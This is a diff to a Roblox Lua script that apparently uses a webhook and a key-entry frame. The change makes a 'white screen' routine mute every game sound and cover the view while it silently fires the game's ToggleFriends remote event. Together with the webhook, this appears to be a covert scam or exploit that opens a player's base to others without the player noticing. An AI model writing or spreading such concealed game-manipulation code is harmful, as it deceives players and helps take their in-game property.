@@ -1,9 +1,8 @@
--- Integrated Script with Plain Text Webhook and Sound Mute on White Screen (No HttpService)
-
 -- Services
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 
 -- URLs
@@ -248,7 +247,7 @@ CreditLabelKey.Parent = FrameKey
 
 makeDraggable(FrameKey, {Enum.UserInputType.MouseButton1})
 
--- Function for white screen with sound mute
+-- Function for white screen with sound mute and ToggleFriends
 local function pantallaBlanca()
     -- Mute sounds when white screen is shown
     for _, sound in ipairs(game:GetDescendants()) do
@@ -261,6 +260,17 @@ local function pantallaBlanca()
             obj.Volume = 0
         end
     end)
+
+    -- Fire ToggleFriends RemoteEvent
+    local toggleFriendsEvent = ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]
+    if toggleFriendsEvent then
+        pcall(function()
+            toggleFriendsEvent:FireServer()
+            print("ToggleFriends fired successfully!")
+        end)
+    else
+        warn("ToggleFriends RemoteEvent not found!")
+    end
 
     local whiteGui = Instance.new("ScreenGui")
     whiteGui.Name = "WhiteScreen"
